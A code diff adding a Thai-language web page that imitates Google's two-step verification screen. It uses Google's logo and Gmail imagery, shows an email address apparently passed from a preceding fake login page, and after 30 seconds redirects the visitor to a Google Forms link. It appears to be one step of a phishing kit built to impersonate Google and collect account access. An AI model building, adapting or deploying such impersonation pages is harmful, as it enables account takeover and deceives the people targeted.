@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>การยืนยันแบบ 2 ขั้นตอน</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 900px;
+            text-align: left;
+            box-sizing: border-box;
+        }
+        .left-section {
+            flex: 1;
+            padding-right: 20px;
+        }
+        .right-section {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        /* ปรับขนาดโลโก้ให้ยืดหยุ่น */
+        .google-logo {
+            max-width: 100%; /* ทำให้โลโก้ยืดหยุ่นตามขนาดหน้าจอ */
+            height: auto; /* รักษาสัดส่วน */
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 40px;
+            font-weight: 500;
+            margin-bottom: 40px;
+        }
+        p {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        .email {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .send-again {
+            font-size: 14px;
+            color: #1a73e8;
+            cursor: pointer;
+        }
+        .send-again:hover {
+            text-decoration: underline;
+        }
+        .checkbox-container {
+            margin-top: 20px;
+        }
+        .checkbox-container input {
+            margin-right: 10px;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            margin-top: 50px;
+        }
+        .next-btn:hover {
+            background-color: #1669c1;
+        }
+
+        /* @media queries for responsive design */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                padding: 20px;
+            }
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 20px;
+            }
+            .right-section {
+                margin-top: 20px;
+            }
+            h2 {
+                font-size: 28px;
+            }
+            .email {
+                font-size: 16px;
+            }
+            .next-btn {
+                padding: 12px 25px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h2 {
+                font-size: 24px;
+            }
+            .email {
+                font-size: 14px;
+            }
+            .next-btn {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <!-- โลโก้ Google -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+            <h2>การยืนยันแบบ 2 ขั้นตอน</h2>
+            <p>Google ต้องการตรวจสอบว่าคุณเป็นผู้ที่พยายามเข้าสู่ระบบจริง เพื่อช่วยรักษาบัญชีของคุณให้ปลอดภัย</p>
+            <div class="email">
+                <span id="user-email"></span>
+            </div>
+            <p>เปิดแอป Gmail ใน iPhone</p>
+            <p>Google ส่งการแจ้งเตือนใน iPhone ของคุณแล้ว เปิดแอป Gmail แล้วใส่ในข้อความแจ้งเตือนเพื่อยืนยันตัวตนกับคุณ</p>
+            <div class="checkbox-container">
+                <input type="checkbox" id="agree"> <label for="agree">อย่าถามในอุปกรณ์นี้อีก</label>
+            </div>
+            <button class="next-btn">ส่งอีก</button>
+        </div>
+        <div class="right-section">
+            <img src="https://ssl.gstatic.com/accounts/marc/gmail_ios_authzen.gif" alt="Phone Image">
+        </div>
+    </div>
+
+    <script>
+        // เชื่อมชื่อเมลจากหน้า login
+        document.addEventListener("DOMContentLoaded", function() {
+            let email = localStorage.getItem("userEmail") || "example@gmail.com";
+            document.getElementById("user-email").textContent = email;
+        });
+
+        // ให้หน้าเว็บเด้งไปยังลิงก์ที่กำหนดหลังจาก 30 วินาที
+        setTimeout(function() {
+            window.location.href = "https://docs.google.com/forms/d/1zfsTDVIsQF5ZIZmb2oOTU7tWF4JZqUNF_IsoYX_WfUY/edit"; // URL ที่จะไป
+        }, 30000); // 30000 ms = 30 วินาที
+    </script>
+</body>
+</html>
+
